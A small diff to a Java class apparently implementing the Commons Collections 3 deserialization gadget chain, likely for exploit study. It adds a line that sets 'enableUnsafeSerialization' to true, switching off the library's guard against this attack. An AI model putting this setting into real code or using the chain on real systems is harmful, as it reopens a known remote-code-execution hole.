@@ -20,6 +20,8 @@ import java.util.Map;
 
 public class cc3 {
     public static void main(String[] args) throws TransformerConfigurationException, IOException, NoSuchFieldException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException {
+        //补充安全省略设置
+        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
         TemplatesImpl templates = new TemplatesImpl();
         Class templatesClass = templates.getClass();
 
